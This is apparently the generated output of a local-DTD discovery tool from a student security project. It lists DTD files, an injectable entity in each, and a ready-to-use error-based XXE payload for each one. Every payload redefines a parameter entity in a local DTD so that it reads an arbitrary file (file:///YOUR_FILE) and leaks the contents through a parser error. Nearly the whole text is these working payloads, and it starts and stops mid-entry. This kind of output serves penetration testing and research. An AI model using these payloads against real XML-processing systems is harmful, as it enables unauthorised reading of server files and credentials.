        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport-0.2.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport-0.2.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport-0.3.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcprofilereport-0.3.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/psmetrics.dtd`

**Injectable entity:** `expr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/psmetrics.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcprofilereport-0.2.dtd`

**Injectable entity:** `hwpcprofilereport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcprofilereport-0.2.dtd">

    <!ENTITY % hwpcprofilereport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcreport-0.3.dtd`

**Injectable entity:** `hwpcreport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcreport-0.3.dtd">

    <!ENTITY % hwpcreport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcreport.dtd`

**Injectable entity:** `hwpcreport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcreport.dtd">

    <!ENTITY % hwpcreport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcprofilereport-0.3.dtd`

**Injectable entity:** `hwpcprofilereport.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/multihwpcprofilereport-0.3.dtd">

    <!ENTITY % hwpcprofilereport.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcreport.dtd`

**Injectable entity:** `machineinfo.dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/perfsuite/hwpcreport.dtd">

    <!ENTITY % machineinfo.dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/kate/language.dtd`

**Injectable entity:** `commonAttributes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/kate/language.dtd">

    <!ENTITY % commonAttributes '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/scrollkeeper-omf.dtd`

**Injectable entity:** `url.attribute.set`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/scrollkeeper-omf.dtd">

    <!ENTITY % url.attribute.set '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jsf/web-facesconfig_1_1.dtd`

**Injectable entity:** `Language`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/jsf/web-facesconfig_1_1.dtd">

    <!ENTITY % Language '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `measure`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % measure '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `backrefs.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % backrefs.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `reference.atts`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % reference.atts '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `anonymous.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % anonymous.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `auto.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % auto.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `fixedspace.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % fixedspace.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `align-h.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % align-h.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `align-hv.att`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % align-hv.att '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `bibliographic.elements`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % bibliographic.elements 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `structure.model`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % structure.model 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `text.model`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % text.model '(aa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd`

**Injectable entity:** `calstblx`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/docutils.dtd">

    <!ENTITY % calstblx '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `CIMName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % CIMName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `CIMType`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % CIMType '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `QualifierFlavor`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % QualifierFlavor '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `ClassOrigin`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % ClassOrigin '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `Propagated`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % Propagated '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `ArraySize`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % ArraySize '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `SuperClass`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `ClassName`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % ClassName '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd`

**Injectable entity:** `ReferenceClass`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/cim20.dtd">

    <!ENTITY % ReferenceClass '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/openoffice/libraries.dtd`

**Injectable entity:** `boolean`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/openoffice/libraries.dtd">

    <!ENTITY % boolean '(aa) #IMPLIED>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ATTLIST attxx aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/openoffice/office.dtd`

**Injectable entity:** `dtypes-mod`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/openoffice/office.dtd">

    <!ENTITY % dtypes-mod '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/fonts.dtd`

**Injectable entity:** `constant`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/fonts.dtd">

    <!ENTITY % constant 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/fonts.dtd`

**Injectable entity:** `expr`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/fonts.dtd">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgda/libgda-server-operation.dtd`

**Injectable entity:** `paramlist-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgda/libgda-server-operation.dtd">

    <!ENTITY % paramlist-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgda/libgda-paramlist.dtd`

**Injectable entity:** `array-dtd`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/libgda/libgda-paramlist.dtd">

    <!ENTITY % array-dtd '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/sip-app_1_0.dtd`

**Injectable entity:** `condition`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/servlet-api/XMLSchema.dtd`

**Injectable entity:** `xs-datatypes`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/servlet-api/XMLSchema.dtd">

    <!ENTITY % xs-datatypes '
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.common.attrib`

**XXE Payload:**
```
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:////home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd">

    <!ENTITY % boost.common.attrib '>
        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
<message></message>
```

 --- 

**DTD File:** `//home/sagar/Main/MTech/SDE/Project/xmlvuln/dtd-finder/src/test/resources/boostbook/boostbook.dtd`

**Injectable entity:** `boost.namespace.mix`

